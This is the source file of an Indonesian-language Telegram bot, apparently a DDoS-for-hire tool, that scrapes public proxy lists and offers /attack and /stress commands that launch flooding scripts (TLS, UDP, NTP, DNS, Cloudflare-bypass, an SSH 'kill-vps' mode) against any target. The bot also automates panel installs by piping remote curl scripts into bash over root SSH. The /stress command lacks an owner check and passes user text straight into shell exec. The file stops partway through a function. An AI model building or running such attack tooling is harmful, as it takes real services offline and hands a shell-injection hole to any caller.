/*
[+] ============================== [+]
BASE BY @wannoffc
ADD FITUR : RuztanXD ( Si Pemula ygy )

Tq
ALLAH
PENGGUNA BOT
WANNOFC
RUZTANXD

#MAAF KLO ADA YG KURANG INTINYA YQ ALL

JANGAN DI HAPUS SU HARGAI CREDITS DIKIT
*/

const TelegramBot = require('node-telegram-bot-api');
const { Client } = require('ssh2');
const { exec } = require('child_process');
const fs = require('fs');
const axios = require('axios');
//const owner = config.adminId;
const settings = require('./config');
const owner = settings.adminId;
const botToken = settings.token;
const adminfile = 'adminID.json';
const premiumUsersFile = 'premiumUsers.json';
const domain = settings.domain;
const plta = settings.plta;
const pltc = settings.pltc;
try {
    premiumUsers = JSON.parse(fs.readFileSync(premiumUsersFile));
} catch (error) {
    console.error('Error reading premiumUsers file:', error);
}
const bot = new TelegramBot(botToken, { polling: true });
try {
    adminUsers = JSON.parse(fs.readFileSync(adminfile));
} catch (error) {
    console.error('Error reading adminUsers file:', error);
}
const sendMessage = (chatId, text) => bot.sendMessage(chatId, text);
function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}
function getRuntime(startTime) {
    const uptime = process.uptime();
    const hours = Math.floor(uptime / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    const seconds = Math.floor(uptime % 60);
    return `${hours} Jam ${minutes} Menit ${seconds} Detik`;
}
// File untuk logging
const logFile = 'bot.log';

// Fungsi untuk menulis log ke file dan console
function logToFileAndConsole(message) {
  const timestamp = new Date().toISOString();
  const logMessage = `[${timestamp}] ${message}\n`;
  console.log(logMessage);
  fs.appendFileSync(logFile, logMessage);
}

// Scrape proxy dari sumber yang diberikan
async function scrapeProxies() {
  const proxySources = [
    'https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=http&proxy_format=ipport&format=text&timeout=20000',
    'https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/http.txt',
    'https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt',
    'https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/https.txt',
    'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
    'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt',
    'https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/http.txt',
    'https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/https.txt',
    'https://raw.githubusercontent.com/berkay-digital/Proxy-Scraper/main/proxies.txt',
    'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt',
    'https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt',
    'https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt',
    'https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/http.txt',
    'https://raw.githubusercontent.com/HumayunShariarHimu/Proxy/main/Anonymous_HTTP_One.md',
    'https://raw.githubusercontent.com/ArrayIterator/proxy-lists/main/proxies/https.txt',
    'https://raw.githubusercontent.com/ArrayIterator/proxy-lists/main/proxies/http.txt',
    'https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt',
    'https://raw.githubusercontent.com/zloi-user/hideip.me/main/http.txt',
    'https://raw.githubusercontent.com/zloi-user/hideip.me/main/https.txt',
    'https://raw.githubusercontent.com/elliottophellia/proxylist/master/results/http/global/http_checked.txt',
    'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/https/https.txt'
  ];

  let proxies = [];

    // Hapus file proxy.txt lama
  if (fs.existsSync('proxy.txt')) {
    fs.unlinkSync('proxy.txt');
    logToFileAndConsole('proxy.txt lama berhasil dihapus');
  }
  
  for (const source of proxySources) {
    try {
      const response = await axios.get(source);
      proxies = proxies.concat(response.data.split('\n'));
    } catch (error) {
      logToFileAndConsole(`Error scraping proxies from ${source}: ${error.message}`);
    }
  }

  fs.writeFileSync('proxy.txt', proxies.join('\n'));
  logToFileAndConsole('Proxies successfully scraped and saved to proxy.txt');
}

// Mulai dengan scraping proxy saat bot dijalankan
scrapeProxies();
const nama = 'HITSSSH';
const author = 'HITSSSH';
// Informasi waktu mulai bot
const startTime = Date.now();
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// Command /method untuk menunjukkan metode yang tersedia
bot.onText(/\/ddosmenu/, (msg) => {
  const chatId = msg.chat.id;
  const message = "Contoh command:\n/attack method target duration [port]\nMethod: strike, tls, flood, kill-vps, dns, ntp, spike, raw, thunder, bypass, tcp, udp, destroy, storm, tls-kill, tls-op /methods, uam\nContoh:\n/attack flood https://example.com 120\n/attack tls https://example.com 120\n/stress udp 167.172.36.49 120 22\n/updateproxy\n/proxycount\nBy @HITSSSH";
  bot.sendMessage(chatId, message);
  logToFileAndConsole(`Sent /start message to chat ${chatId}`);
});

// Command /updateproxy untuk memperbarui proxy
bot.onText(/\/updateproxy/, (msg) => {
  const chatId = msg.chat.id;
  scrapeProxies();
  const message = "Proxy Updated.";
  bot.sendMessage(chatId, message);
});

// COMMAND UNTUK MENAMPILKAN MENU METHODS
bot.onText(/\/method/, (msg) => {
  const chatId = msg.chat.id;
  const message = "Metode yang tersedia:\nLayer 4\n• /udp\n• /kill-vps\n• /tcp\n• /ntp\n• /dns\n\nLayer 7\n• /tls\n• /strike\n• /flood\n• /spike\n• /raw\n• /gojo\n• /thunder\n• /bypass\n• /storm\n• /destroy\n• /tlskill\n• /tlsop\n• /uam\nBy @hitsssh";
  bot.sendMessage(chatId, message);
  logToFileAndConsole(`Sent /method message to chat ${chatId}`);
});
// Command /attack untuk meluncurkan perintah di VPS
bot.onText(/\/attack (.+) (.+) (.+)(?: (.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const method = match[1]; // Ambil method dari command
  const target = match[2]; // Ambil target dari command
  const duration = match[3]; // Ambil duration dari command
  const port = match[4]; // Ambil port dari command, jika ada
  if (settings.adminId.includes(String(msg.from.id))) {
  let command;

  switch (method) {
    case 'strike':
      command = `node methods/strike.js GET ${target} ${duration} 10 90 proxy.txt --full --legit`;
      break;
    case 'tls':
      command = `node methods/tls.js ${target} ${duration} 100 10`;
      break;
    case 'flood':
      command = `node methods/flood.js ${target} ${duration}`;
      break;
    case 'spike':
      command = `node methods/spike.js ${target} 10 ${duration}`;
      break;
    case 'raw':
      command = `node methods/raw.js ${target} ${duration}`;
      break;
    case 'gojo':
      command = `node methods/gojov5.js ${target} ${duration} 100 10 proxy.txt`;
      break;
    case 'tlskill':
      command = `node methods/TLS-KILL.js ${target} ${duration} 100 10 proxy.txt`;
      break;
    case 'tlsop':
      command = `node methods/tlsop.js ${target} ${duration} 100 10 proxy.txt`;
      break;
    case 'storm':
      command = `node methods/storm.js ${target} ${duration} 100 10 proxy.txt`;
      break;
    case 'destroy':
      command = `node methods/DESTROY.js ${target} ${duration} 100 10 proxy.txt`;
      break;
    case 'thunder':
      command = `node methods/thunder.js ${target} ${duration} 100 10 proxy.txt`;
      break;
    case 'bypass':
      command = `node methods/bypass.js ${target} ${duration} 100 10 proxy.txt`;
      break;
    case 'cf-flood':
      command = `node methods/cf-flood.js ${target} ${duration}`;
      break;
    case 'http-vip':
      command = `node methods/HTTP-VIP.js ${target} ${duration} 100 10 proxy.txt}`;
      break;
    case 'uam':
      command = `node methods/uambypass.js ${target} ${duration} 100 proxy.txt`;
      break;
    default:
      bot.sendMessage(chatId, "Metode tidak dikenali atau format salah. Gunakan /method untuk melihat metode yang tersedia.");
      return;
  }

  logToFileAndConsole(`Received /attack command from chat ${chatId}. Executing: ${command}`);


  // Kirim pesan bahwa attack telah diluncurkan
  bot.sendMessage(chatId, `\`\`\`Attack Attack launched!\nTarget: ${target}\nDuration: ${duration}\nMethod: ${method}\`\`\``, { parse_mode: 'Markdown' });

  exec(command, (error, stdout, stderr) => {
    if (error) {
      const errorMessage = `Error: ${error.message}\nStderr: ${stderr}`;
      bot.sendMessage(chatId, errorMessage);
      logToFileAndConsole(`Execution error for chat ${chatId}: ${errorMessage}`);
      return;
    }
    if (stderr) {
      const stderrMessage = `Stderr: ${stderr}`;
      bot.sendMessage(chatId, stderrMessage);
      logToFileAndConsole(`Execution stderr for chat ${chatId}: ${stderr}`);
      return;
    }
    const successMessage = `Command sukses dijalankan! Output:\n${stdout}`;
    bot.sendMessage(chatId, successMessage);
    logToFileAndConsole(`Command executed successfully for chat ${chatId}. Output: ${stdout}`);
  });
   } else {
      bot.sendMessage(chatId, 'Fitur Ini Khusus Owner Saya!!!');
    }
});
bot.onText(/\/stress (.+) (.+) (.+) (.+)(?: (.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const method = match[1]; // Ambil method dari command
  const target = match[2]; // Ambil target dari command
  const duration = match[3]; // Ambil duration dari command
  const port = match[4] || ''; // Ambil port dari command
  let command;

  switch (method) {
    case 'udp':
      command = `node methods/udp.js ${target} ${port} ${duration}`;
      break;
    case 'kill-vps':
      exec(`node methods/StarsXSSH.js ${target} 22 root ${duration}`)
      exec(`node methods/flood.js https://${target} ${duration}`)
      exec(`node methods/raw.js http://${target} ${duration}`)
      break;
    case 'tcp':
      command = `node methods/tcp.js ${target} ${port} ${duration}`
      break;
    case 'dns':
      command = `node methods/dns.js ${target} ${port} ${duration}`
      break;
    case 'ntp':
      command = `node methods/ntp.js ${target} ${port} ${duration}`
      break;
    default:
      bot.sendMessage(chatId, "Metode tidak dikenali atau format salah. Gunakan /method untuk melihat metode yang tersedia.");
      return;
  }
  logToFileAndConsole(`Received /stress command from chat ${chatId}. Executing: ${command}`);
  // Kirim pesan bahwa attack telah diluncurkan
  bot.sendMessage(chatId, `\`\`\`Attack Attack launched!\nTarget: ${target}\nDuration: ${duration}\nMethod: ${method}\nPort: ${port}\`\`\``, { parse_mode: 'Markdown' });
  
  exec(command, (error, stdout, stderr) => {
    if (error) {
      const errorMessage = `Error: ${error.message}\nStderr: ${stderr}`;
      bot.sendMessage(chatId, errorMessage);
      logToFileAndConsole(`Execution error for chat ${chatId}: ${errorMessage}`);
      return;
    }
    if (stderr) {
      const stderrMessage = `Stderr: ${stderr}`;
      bot.sendMessage(chatId, stderrMessage);
      logToFileAndConsole(`Execution stderr for chat ${chatId}: ${stderr}`);
      return;
    }
    const successMessage = `Command sukses dijalankan! Output:\n${stdout}`;
    bot.sendMessage(chatId, successMessage);
    logToFileAndConsole(`Command executed successfully for chat ${chatId}. Output: ${stdout}`);
  });
});
// Handler untuk command /proxycount
bot.onText(/\/proxycount/, (msg) => {
  const chatId = msg.chat.id;

  fs.readFile('proxy.txt', 'utf8', (err, data) => {
    if (err) {
      bot.sendMessage(chatId, "Gagal membaca file proxy.txt. Pastikan file tersebut ada dan bisa diakses.");
      logToFileAndConsole(`Error reading proxy.txt: ${err.message}`);
      return;
    }

    // Pisahkan setiap baris yang ada di file proxy.txt
    const proxies = data.split('\n').filter(Boolean);
    const proxyCount = proxies.length;

    bot.sendMessage(chatId, `Jumlah proxy yang ada di proxy.txt: ${proxyCount}`);
    logToFileAndConsole(`Sent proxy count: ${proxyCount} to chat ${chatId}`);
  });
});      
// Command /ongoing untuk mengecek command yang sedang berjalan
bot.onText(/\/ongoing/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, "Tidak ada command yang sedang berjalan.");
  logToFileAndConsole(`Checked ongoing commands for chat ${chatId}`);
});

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const startTime = Date.now();
    const menuText = `
╭───〔 💻 INFO BOT 〕───
│ 👑 Owner   : @kibiljoe
│ 🛠️ Channel : @hitsssh
╰───────────────⟢

╭─〔 📦 INSTALL PANEL 〕
│ ⚙️ /installpanel   
│ ⚙️ /installpanelv2 
│ 🚀 /startwings
╰───────────────────⟢

╭─〔 🎨 OS SUPPORT 〕
│ 🖥️ Ubuntu 20 Debian 11 〔 V1 〕
│ 🔓 Debian 12 Ubuntu 22 & 24〔 V2 〕
│ ⚙️ Recommended Ubuntu 22 & 24
╰───────────────────⟢

╭─〔 ⛔ NO SPAM INSTALL BOT 〕
│ ⏯️ Beri Jeda Jika Install Banyak 
╰───────────────────⟢

╭─〔 ⏰ BOT ONLINE 24 JAM 〕
│ 🌐 Memakai Hosting Berbayar Legal
╰───────────────────⟢
       
          ⌕ █║▌║▌║ - ║▌║▌║█ ⌕`;
// Event listener for button 'My Profil'
bot.on('callback_query', (callbackQuery) => {
  if (callbackQuery.data === 'myprofil') {
    bot.answerCallbackQuery(callbackQuery.id);
    bot.sendMessage(callbackQuery.from.id, 'Hallo, saya adalah peler. Bot Ini Milik @hitsssh');
  }
});
// Event listener for button 'Start'
bot.on('callback_query', (callbackQuery) => {
    if (callbackQuery.data === 'start') {
        const chatId = callbackQuery.message.chat.id;
        const startTime = Date.now();

        const menuText = `
╭───〔 💻 INFO BOT 〕───
│ 👑 Owner   : @kibiljoe
│ 🛠️ Channel : @hitsssh
╰───────────────⟢

╭─〔 📦 INSTALL PANEL 〕
│ ⚙️ /installpanel   
│ ⚙️ /installpanelv2 
│ 🚀 /startwings
╰───────────────────⟢

╭─〔 🎨 OS SUPPORT 〕
│ 🖥️ Ubuntu 20 Debian 11 〔 V1 〕
│ 🔓 Debian 12 Ubuntu 22 & 24〔 V2 〕
│ ⚙️ Recommended Ubuntu 22 & 24
╰───────────────────⟢

╭─〔 ⛔ NO SPAM INSTALL BOT 〕
│ ⏯️ Beri Jeda Jika Install Banyak 
╰───────────────────⟢

╭─〔 ⏰ BOT ONLINE 24 JAM 〕
│ 🌐 Memakai Hosting Berbayar Legal
╰───────────────────⟢
       
          ⌕ █║▌║▌║ - ║▌║▌║█ ⌕`;
  const message = menuText;
 const keyboard = {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '💵 Donasi', callback_data: 'donasi' }, { text: '🙋‍♂️ My Profil', callback_data: 'myprofil' }],

                ]
            }
        };
        bot.answerCallbackQuery(callbackQuery.id);
        bot.editMessageText(message, {
            chat_id: chatId,
            message_id: callbackQuery.message.message_id,
            reply_markup: keyboard,
            parse_mode: 'Markdown'
        });
    }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// ramlist2
// Ganti bagian keyboard Anda dengan ini
const message = menuText;
const keyboard = {
    reply_markup: {
        inline_keyboard: [
            // Tombol 'CPANEL' diubah menjadi 'Donasi'
            [{ text: '💰 Donasi', callback_data: 'donasi' }, { text: '🙋‍♂️ My Profil', callback_data: 'myprofil' }],
        ]
    }
}; 
bot.sendMessage(chatId, message, keyboard);
});


// Ganti seluruh blok bot.on('callback_query', ...) Anda dengan ini
bot.on('callback_query', (callbackQuery) => {
    const data = callbackQuery.data;
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;

    // Handler untuk tombol 'donasi' yang baru
    if (data === 'donasi') {
        bot.answerCallbackQuery(callbackQuery.id);

        // --- PENTING: Ganti dengan file_id atau URL gambar QRIS Anda ---
        const qrisImage = 'https://qu.ax/xmhfH.jpg';

        // (Opsional) Hapus pesan menu sebelumnya agar chat lebih rapi
        bot.deleteMessage(chatId, messageId).catch(err => console.log("Pesan mungkin sudah terhapus."));

        // Kirim foto QRIS dengan caption dan tombol kembali
        bot.sendPhoto(chatId, qrisImage, {
            caption: 'Terima kasih sudah mau berdonasi! 🙏\n\nSilakan scan QRIS di atas untuk mendukung kami.',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '⬅️ Kembali ke Menu', callback_data: 'start' }]
                ]
            }
        });
    }

    // Handler untuk tombol lain (jika ada) bisa ditambahkan di sini
    // Contoh untuk tombol 'myprofil'
    if (data === 'myprofil') {
        bot.answerCallbackQuery(callbackQuery.id);
        bot.sendMessage(chatId, 'Ini adalah profil Owner: @hitsssh');
    }
    
    // Contoh untuk tombol kembali ke menu 'start'
    if (data === 'start') {
        // ... kode untuk menampilkan menu start lagi ...
    }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
bot.onText(/\/menupanel/, (msg) => {
    const chatId = msg.chat.id;
    const sender = msg.from.username;
    const id = msg.from.id;
    const owner = '6350764506'; // Ganti dengan ID pemilik bot 
    const tanxd = `Hi @${sender} 👋
    
/addprem idtele\ncontoh: /addprem 6350764506\n\n/createadmin\n\n/cekid

TESTIMONI: https://whatsapp.com/channel/0029VaulVUBF1YlTmLW2FW02

🙏🏼 Permisi, bot akan pergi secara otomatis.
 Developer : @hitsssh`;
    const keyboard = {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'Testimoni', url: 'https://whatsapp.com/channel/0029VaulVUBF1YlTmLW2FW02' }, { text: 'List Produk Lainnya', url: 'https://t.me/hitsssh' }],
                [{ text: 'List Murid Unban & Banned', url: 'https://t.me/hitsssh' }]
            ]
        }
    };
    const halodek = "https://files.catbox.moe/ypc1w9.jpg"
    bot.sendPhoto(chatId, halodek, { caption: tanxd, parse_mode: 'Markdown', reply_markup: keyboard });
});
// sc
bot.onText(/\/sc/, (msg) => {
    const chatId = msg.chat.id;
    const sender = msg.from.username;
    const id = msg.from.id;
    const owner = '6350764506'; // Ganti dengan ID pemilik bot 
    const tanxd = `Hi @${sender} 👋
    
👤 BUY BJIR KE @hitsssh

TESTIMONI: https://whatsapp.com/channel/0029VaulVUBF1YlTmLW2FW02

🙏🏼 Permisi, bot akan pergi secara otomatis.
 Developer : @hitsssh`;
    const keyboard = {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'Testimoni', url: 'https://whatsapp.com/channel/0029VaulVUBF1YlTmLW2FW02' }, { text: 'List Produk Lainnya', url: 'https://t.me/hitsssh' }],
                [{ text: 'List Murid Unban & Banned', url: 'https://t.me/hitsssh' }]
            ]
        }
    };
    const halodek = "https://files.catbox.moe/ypc1w9.jpg"
    bot.sendPhoto(chatId, halodek, { caption: tanxd, parse_mode: 'Markdown', reply_markup: keyboard });
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// Command Handler 'installpanel'
// INSTALL PANEL VPS VERSI 20.04.4
bot.onText(/^(\.|\#|\/)installpanel$/, async (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, `Format salah!\nPenggunaan: /installpanel ipvps,password,domainpnl,domainnode,ramvps ( contoh : 80000 = ram 8)\nOwner @hitsssh`);
  });
bot.onText(/\/installpanel (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];
  const t = text.split(',');
  if (settings.adminId.includes(String(msg.from.id))) {
  if (t.length < 5) {
    return bot.sendMessage(chatId, 'Format salah!\nPenggunaan: /installpanel ipvps,password,domainpnl,domainnode,ramvps ( contoh : 80000 = ram 8)\nOwner @hitsssh');
  }
  const ipvps = t[0];
  const passwd = t[1];
  const subdomain = t[2];
  const domainnode = t[3];
  const ramvps = t[4];
  const connSettings = {
    host: ipvps,
    port: 22,
    username: 'root',
    password: passwd
  };
 let password = generateRandomPassword();
 const command = 'bash <(curl -s https://pterodactyl-installer.se)';
 const commandWings = 'bash <(curl -s https://pterodactyl-installer.se)';  
 const conn = new Client();

  conn.on('ready', () => {
    sendMessage(chatId, `PROSES PENGINSTALLAN SEDANG BERLANGSUNG MOHON TUNGGU 5-10MENIT\nscript by @hitsssh`);
    conn.exec(command, (err, stream) => {
      if (err) throw err;

      stream.on('close', (code, signal) => {
        console.log(`Stream closed with code ${code} and signal ${signal}`);
        installWings(conn, domainnode, subdomain, password, ramvps);
      }).on('data', (data) => {
        handlePanelInstallationInput(data, stream, subdomain, password);
      }).stderr.on('data', (data) => {
        console.log('STDERR: ' + data);
      });
    });
  }).connect(connSettings);
  
  async function installWings(conn, domainnode, subdomain, password, ramvps) {
        sendMessage(chatId, `PROSES PENGINSTALLAN WINGS SEDANG BERLANGSUNG MOHON TUNGGU 5 MENIT\nscript by @hitsssh`);
        conn.exec(commandWings, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Wings installation stream closed with code ${code} and signal ${signal}');
                createNode(conn, domainnode, ramvps, subdomain, password);
            }).on('data', (data) => {
                handleWingsInstallationInput(data, stream, domainnode, subdomain);
        }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }

    async function createNode(conn, domainnode, ramvps, subdomain, password) {
        const command = 'bash <(curl https://raw.githubusercontent.com/RuztanHosting/RuzPrivat/main/install.sh)';
        sendMessage(chatId, `MEMULAI CREATE NODE & LOCATION\nscript by @hitsssh`);     
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Node creation stream closed with code ${code} and ${signal} signal');
                conn.end();
                sendPanelData(subdomain, password);
            }).on('data', (data) => {
                handleNodeCreationInput(data, stream, domainnode, ramvps);
        }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }
        
   // Func Handler 'sendPanelData' 
    function sendPanelData(subdomain, password) {
        sendMessage(chatId,`DATA PANEL ANDA\n\n🟢 USERNAME: admin\n🟢 PASSWORD: ${password}\n🟢 LOGIN: ${subdomain}\n\nNote: Semua Instalasi Telah Selesai Silahkan Simpan Data Admin Dengan Baik \nNote: Jika Data Hilang Maka Admin Tidak Bertanggung Jawab \nscript by @hitsssh`);
    }
    
   // Func Handler 'handlePanelInstallationInput' 
   function handlePanelInstallationInput(data, stream, subdomain, password) {
        if (data.toString().includes('Input')) {
            stream.write('0\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1248\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('Asia/Jakarta\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('adm\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('adm\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${password}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('yes\n');
        }
        if (data.toString().includes('Please read the Terms of Service')) {
            stream.write('A\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        console.log('STDOUT: ' + data);
    }
    
    // Func Handler 'handleWingsInstallationInput'
    function handleWingsInstallationInput(data, stream, domainnode, subdomain) {
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('user\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1248\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${domainnode}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        console.log('STDOUT: ' + data);
    }

    function handleNodeCreationInput(data, stream, domainnode, ramvps) {
        stream.write('ruztanxd\n');
        stream.write('4\n');
        stream.write('LOCATION\n');
        stream.write('Jangan Lupa Sholat\n');
        stream.write(`${domainnode}\n`);
        stream.write('NODES\n');
        stream.write(`${ramvps}\n`);
        stream.write(`${ramvps}\n`);
        stream.write('1\n');
        console.log('STDOUT: ' + data);
    }
  } else {
      bot.sendMessage(chatId, 'Fitur Ini Khusus Owner Saya!!!');
    }
});
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// INSTALL PANEL VPS VERSI 22.04.4 & 24.04.4
bot.onText(/^(\.|\#|\/)installpanelv2$/, async (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, `Format salah!\nPenggunaan: /installpanelv2 ipvps,password,domainpnl,domainnode,ramvps ( contoh : 80000 = ram 8)\nOwner @hitsssh`);
  });
bot.onText(/\/installpanelv2 (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];
  const t = text.split(',');
  if (settings.adminId.includes(String(msg.from.id))) {
  if (t.length < 5) {
    return bot.sendMessage(chatId, 'Format salah!\nPenggunaan: /installpanelv2 ipvps,password,domainpnl,domainnode,ramvps ( contoh : 80000 = ram 8)\nOwner @hitsssh');
  }
  const ipvps = t[0];
  const passwd = t[1];
  const subdomain = t[2];
  const domainnode = t[3];
  const ramvps = t[4];
  const connSettings = {
    host: ipvps,
    port: 22,
    username: 'root',
    password: passwd
  };
 let password = generateRandomPassword();
 const command = 'bash <(curl -s https://pterodactyl-installer.se)';
 const commandWings = 'bash <(curl -s https://pterodactyl-installer.se)';  
 const conn = new Client();

  conn.on('ready', () => {
    sendMessage(chatId, `PROSES PENGINSTALLAN SEDANG BERLANGSUNG MOHON TUNGGU 5-10MENIT\nscript by @hitsssh`);
    conn.exec(command, (err, stream) => {
      if (err) throw err;

      stream.on('close', (code, signal) => {
        console.log(`Stream closed with code ${code} and signal ${signal}`);
        installWings(conn, domainnode, subdomain, password, ramvps);
      }).on('data', (data) => {
        handlePanelInstallationInput(data, stream, subdomain, password);
      }).stderr.on('data', (data) => {
        console.log('STDERR: ' + data);
      });
    });
  }).connect(connSettings);
  
  async function installWings(conn, domainnode, subdomain, password, ramvps) {
        sendMessage(chatId, `PROSES PENGINSTALLAN WINGS SEDANG BERLANGSUNG MOHON TUNGGU 5 MENIT\nscript by @hitsssh`);
        conn.exec(commandWings, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Wings installation stream closed with code ${code} and signal ${signal}');
                createNode(conn, domainnode, ramvps, subdomain, password);
            }).on('data', (data) => {
                handleWingsInstallationInput(data, stream, domainnode, subdomain);
        }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }

    async function createNode(conn, domainnode, ramvps, subdomain, password) {
        const command = 'bash <(curl https://raw.githubusercontent.com/RuztanHosting/RuzPrivat/main/install.sh)';
        sendMessage(chatId, `MEMULAI CREATE NODE & LOCATION\nscript by @hitsssh`);     
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Node creation stream closed with code ${code} and ${signal} signal');
                conn.end();
                sendPanelData(subdomain, password);
            }).on('data', (data) => {
                handleNodeCreationInput(data, stream, domainnode, ramvps);
        }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }
        
   // Func Handler 'sendPanelData' 
    function sendPanelData(subdomain, password) {
        sendMessage(chatId,`DATA PANEL ANDA\n\n🟢 USERNAME: admin\n🟢 PASSWORD: ${password}\n🟢 LOGIN: ${subdomain}\n\nNote: Semua Instalasi Telah Selesai SilahkanSimpan Data Admin Dengan Baik \nNote: Jika Data Hilang Maka Admin Tidak Bertanggung Jawab\nscript by @hitsssh`);
    }
    
   // Func Handler 'handlePanelInstallationInput' 
   function handlePanelInstallationInput(data, stream, subdomain, password) {
        if (data.toString().includes('Input')) {
            stream.write('0\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1248\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('Asia/Jakarta\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('adm\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('adm\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${password}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('yes\n');
        }
        if (data.toString().includes('Please read the Terms of Service')) {
            stream.write('Y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        console.log('STDOUT: ' + data);
    }
    
    // Func Handler 'handleWingsInstallationInput'
    function handleWingsInstallationInput(data, stream, domainnode, subdomain) {
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('user\n');
        }
